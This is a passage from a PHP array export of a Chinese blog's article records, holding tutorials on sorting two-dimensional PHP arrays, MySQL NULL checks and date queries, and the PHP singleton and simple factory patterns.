&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;王五&#39;,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;&nbsp;=&gt;&nbsp;40,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;4,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;赵六&#39;,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;&nbsp;=&gt;&nbsp;31,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;5,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;黄七&#39;,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;&nbsp;=&gt;&nbsp;20,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;);&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$sort&nbsp;=&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;direction&#39;&nbsp;=&gt;&nbsp;&#39;SORT_DESC&#39;,&nbsp;//排序顺序标志&nbsp;SORT_DESC&nbsp;降序；SORT_ASC&nbsp;升序&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;field&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&#39;age&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//排序字段&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$arrSort&nbsp;=&nbsp;array();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;foreach($arrUsers&nbsp;AS&nbsp;$uniqid&nbsp;=&gt;&nbsp;$row){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($row&nbsp;AS&nbsp;$key=&gt;$value){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arrSort[$key][$uniqid]&nbsp;=&nbsp;$value;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($sort[&#39;direction&#39;]){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array_multisort($arrSort[$sort[&#39;field&#39;]],&nbsp;constant($sort[&#39;direction&#39;]),&nbsp;$arrUsers);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;var_dump($arrUsers);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;输出结果：&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=5)&nbsp;
=&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=3)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;=&gt;&nbsp;int&nbsp;5&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;string&nbsp;&#39;黄七&#39;&nbsp;(length=6)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;=&gt;&nbsp;int&nbsp;20&nbsp;
=&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=3)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;=&gt;&nbsp;int&nbsp;2&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;string&nbsp;&#39;李四&#39;&nbsp;(length=6)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;=&gt;&nbsp;int&nbsp;23&nbsp;
=&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=3)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;=&gt;&nbsp;int&nbsp;1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;string&nbsp;&#39;张三&#39;&nbsp;(length=6)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;=&gt;&nbsp;int&nbsp;25&nbsp;
=&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=3)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;=&gt;&nbsp;int&nbsp;4&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;string&nbsp;&#39;赵六&#39;&nbsp;(length=6)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;=&gt;&nbsp;int&nbsp;31&nbsp;
=&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;(size=3)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;=&gt;&nbsp;int&nbsp;3&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;string&nbsp;&#39;王五&#39;&nbsp;(length=6)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;=&gt;&nbsp;int&nbsp;40&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;*/</pre><p><span style=\\"font-family: Arial; font-size: 14px; line-height: 26px;\\">本文来自于 CSDN，转载请标注出处！原文地址：<a href=\\"http://blog.csdn.net/liruxing1715/article/details/28265495\\" target=\\"_blank\\">http://blog.csdn.net/liruxing1715/article/details/28265495</a></span></p>',
            'keyword' => 'php,二维,数组,排序',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:59:04',
          ),
          53 => 
          array (
            'id' => '32',
            'uid' => '1',
            'title' => 'mysql判断字段值是否为NULL',
            'content' => '<p>当我们想在sql语句中已某字段的值是否为null为条件进行查询，使用name = NULL 是不起作用的，</p><p>我们可以使用is null 和is not null 来判断某字段的值是否为null</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;table&nbsp;where&nbsp;name&nbsp;is&nbsp;null</pre><p><br/></p>',
            'keyword' => 'mysql,null',
            'sortid' => '4',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:58:15',
          ),
          54 => 
          array (
            'id' => '31',
            'uid' => '1',
            'title' => 'Mysql计算时间差',
            'content' => '<p>SELECT TIMESTAMPDIFF(SECOND, now(), &quot;2012-11-11 00:00:00&quot;)</p><p>&nbsp;语法为：TIMESTAMPDIFF(unit,datetime1,datetime2)，</p><p>&nbsp;其中unit单位有如下几种，分别是：FRAC_SECOND (microseconds), SECOND, MINUTE, HOUR, DAY, WEEK, MONTH, QUARTER, or YEAR。</p><pre class=\\"brush:sql;toolbar:false\\">SELECT&nbsp;user_id&nbsp;TIMESTAMPDIFF(SECOND,date_start,date_end)&nbsp;as&nbsp;date_lag&nbsp;FROM&nbsp;user_match;</pre><p><br/></p>',
            'keyword' => 'mysql,时间',
            'sortid' => '4',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:57:51',
          ),
          55 => 
          array (
            'id' => '30',
            'uid' => '1',
            'title' => 'mysql查询今天、昨天、近7天、近30天、本月、上一月的SQL语句',
            'content' => '<p>mysql查询今天,昨天,近7天,近30天,本月,上一月数据的方法分析总结：<br/>话说有一文章表article，存储文章的添加文章的时间是add_time字段，该字段为int(5)类型的，现需要查询今天添加的文章总数并且按照时间从大到小排序，则查询语句如下：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;date_format(from_UNIXTIME(`add_time`),&#39;%Y-%m-%d&#39;)&nbsp;=&nbsp;date_format(now(),&#39;%Y-%m-%d&#39;);</pre><p>或者：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;to_days(date_format(from_UNIXTIME(`add_time`),&#39;%Y-%m-%d&#39;))&nbsp;=&nbsp;to_days(now());</pre><p>假设以上表add_time字段的存储类型是DATETIME类型或者TIMESTAMP类型，则查询语句也可按如下写法：</p><p><br/>查询今天的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;to_days(`add_time`)&nbsp;=&nbsp;to_days(now());</pre><p>查询昨天的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;to_days(now())&nbsp;–&nbsp;to_days(`add_time`)&nbsp;&lt;=&nbsp;1;</pre><p>查询近7天的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;date_sub(curdate(),&nbsp;INTERVAL&nbsp;7&nbsp;DAY)&nbsp;&lt;=&nbsp;date(`add_time`);</pre><p>查询近30天的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;date_sub(curdate(),&nbsp;INTERVAL&nbsp;30&nbsp;DAY)&nbsp;&lt;=&nbsp;date(`add_time`);</pre><p>查询本月的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;date_format(`add_time`,&nbsp;‘%Y%m&#39;)&nbsp;=&nbsp;date_format(curdate()&nbsp;,&nbsp;‘%Y%m&#39;);</pre><p>查询上一月的信息记录：</p><pre class=\\"brush:sql;toolbar:false\\">select&nbsp;*&nbsp;from&nbsp;`article`&nbsp;where&nbsp;period_diff(date_format(now()&nbsp;,&nbsp;‘%Y%m&#39;)&nbsp;,&nbsp;date_format(`add_time`,&nbsp;‘%Y%m&#39;))&nbsp;=1;</pre><p><br/></p><p><br/></p>',
            'keyword' => 'mysql,date,时间',
            'sortid' => '4',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:56:18',
          ),
          56 => 
          array (
            'id' => '29',
            'uid' => '1',
            'title' => 'php 设计模式',
            'content' => '<p><strong><span style=\\"font-size: 14pt; color: #ff6600;\\" data-mce-style=\\"font-size: 14pt; color: #ff6600;\\">1.单例模式</span></strong></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">单例模式顾名思义，就是只有一个实例。<span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">作为对象的创建模式， 单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。</span></span></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\"><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\"><br/></span></span></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\"><strong>单例模式的要点有三个：</strong></span></p><ol class=\\" list-paddingleft-2\\"><li><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">一是某个类只能有一个实例；</span></p></li><li><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">二是它必须自行创建这个实例；</span></p></li><li><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">三是它必须自行向整个系统提供这个实例。</span></p></li><li><p></p></li></ol><p><strong>为什么要使用PHP单例模式</strong></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">1. php的应用主要在于<span style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\" data-mce-style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\">数据库应用<span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">, 一个应用中会存在大量的数据库操作, 在使用面向对象的方式开发时, 如果使用单例模式, 则可以避免大量的new 操作消耗的资源,还可以减少数据库连接这样就不容易出现 too many connections情况。</span></span></span></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">2. 如果系统中需要有<span style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\" data-mce-style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\">一个类来全局控制某些配置信息<span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">, 那么使用单例模式可以很方便的实现. 这个可以参看zend Framework的FrontController部分。</span></span></span></p><p><span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">3. 在一次页面请求中, <span style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\" data-mce-style=\\"font-family: &#39;courier new&#39;, courier; font-size: 10pt; color: red;\\">便于进行调试<span style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\" data-mce-style=\\"font-family: &#39;courier new&#39;,courier; font-size: 10pt;\\">, 因为所有的代码(例如数据库操作类db)都集中在一个类中, 我们可以在类中设置钩子, 输出日志，从而避免到处var_dump, echo。</span></span></span></p><p>&nbsp;例子：</p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;*&nbsp;设计模式之单例模式
&nbsp;*&nbsp;$_instance必须声明为静态的私有变量
&nbsp;*&nbsp;构造函数必须声明为私有,防止外部程序new类从而失去单例模式的意义
&nbsp;*&nbsp;getInstance()方法必须设置为公有的,必须调用此方法以返回实例的一个引用
&nbsp;*&nbsp;::操作符只能访问静态变量和静态函数
&nbsp;*&nbsp;new对象都会消耗内存
&nbsp;*&nbsp;使用场景:最常用的地方是数据库连接。
&nbsp;*&nbsp;使用单例模式生成一个对象后，该对象可以被其它众多对象所使用。&nbsp;
&nbsp;*/
&nbsp;class&nbsp;man{&nbsp;&nbsp;&nbsp;&nbsp;//保存例实例在此属性中
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;static&nbsp;$_instance;&nbsp;&nbsp;&nbsp;&nbsp;//构造函数声明为private,防止直接创建对象
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;__construct(){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;我被实例化了！&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;//单例方法
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;get_instance(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_dump(isset(self::$_instance));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!isset(self::$_instance))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self::$_instance=new&nbsp;self();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;self::$_instance;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;//阻止用户复制对象实例
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;__clone(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;trigger_error(&#39;Clone&nbsp;is&nbsp;not&nbsp;allow&#39;&nbsp;,E_USER_ERROR);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;test(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo(&quot;test&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;}
}
//&nbsp;这个写法会出错，因为构造方法被声明为private
//$test&nbsp;=&nbsp;new&nbsp;man;

//&nbsp;下面将得到Example类的单例对象
$test&nbsp;=&nbsp;man::get_instance();
$test&nbsp;=&nbsp;man::get_instance();
$test-&gt;test();
//&nbsp;复制对象将导致一个E_USER_ERROR.
//$test_clone&nbsp;=&nbsp;clone&nbsp;$test;</pre><p><br/></p><p><strong><span style=\\"font-size: 14pt; color: #ff6600;\\" data-mce-style=\\"font-size: 14pt; color: #ff6600;\\">2.简单工厂模式</span></strong></p><ul class=\\" list-paddingleft-2\\"><li><p><span style=\\"font-family: Comic Sans MS;\\" data-mce-style=\\"font-family: Comic Sans MS;\\">①抽象基类：类中定义抽象一些方法，用以在子类中实现</span></p></li><li><p><span style=\\"font-family: Comic Sans MS;\\" data-mce-style=\\"font-family: Comic Sans MS;\\"> ②继承自抽象基类的子类：实现基类中的抽象方法</span></p></li><li><p><span style=\\"font-family: Comic Sans MS;\\" data-mce-style=\\"font-family: Comic Sans MS;\\"> ③工厂类：用以实例化所有相对应的子类</span></p></li></ul><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101420126607431.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101420126607431.png\\"/></p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;定义个抽象的类，让子类去继承实现它
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;abstract&nbsp;class&nbsp;Operation{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//抽象方法不能包含函数体
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;abstract&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2);//强烈要求子类必须实现该功能函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;加法类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;OperationAdd&nbsp;extends&nbsp;Operation&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$num1+$num2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;减法类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;OperationSub&nbsp;extends&nbsp;Operation&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$num1-$num2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;乘法类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;OperationMul&nbsp;extends&nbsp;Operation&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$num1*$num2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;除法类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;OperationDiv&nbsp;extends&nbsp;Operation&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($num2==0){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw&nbsp;new&nbsp;Exception(&quot;除数不能为0&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$num1/$num2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch&nbsp;(Exception&nbsp;$e){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;错误信息：&quot;.$e-&gt;getMessage();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
